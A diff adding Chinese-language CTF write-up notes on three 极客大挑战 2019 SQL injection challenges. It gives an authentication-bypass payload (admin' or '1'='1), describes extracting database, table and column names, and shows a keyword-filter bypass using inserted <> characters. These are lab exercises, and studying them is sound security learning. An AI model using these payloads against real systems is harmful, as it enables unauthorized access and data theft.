@@ -185,3 +185,17 @@ for i in range(0, 50):
                 break
             sys.stdout.write(chr(j))
 ```
+### 11.[极客大挑战 2019]easySQL
+猜测查询语句：
+```sql
+select * from 表名 where username= '' and password=''
+```
+
+    构造payload:
+        username = admin' or '1'='1
+        password =  1' or '1'='1
+        得到总的代码：select * from users where username = ' admin' or '1'='1  ' and password= '    1' or '1'='1     '
+### 12.[极客大挑战 2019]LoveSQL
+    和上题一样，但不止登陆成功，需要拿到数据库名，表名，字段名，id=16时有flag，让我看了好久名字，估计都是出题人之类的= =
+### 13.[极客大挑战 2019]BabySQL
+    同上题，过滤了，但是<>直接绕过，如sele<>ct passwo<>rd uni<>on等
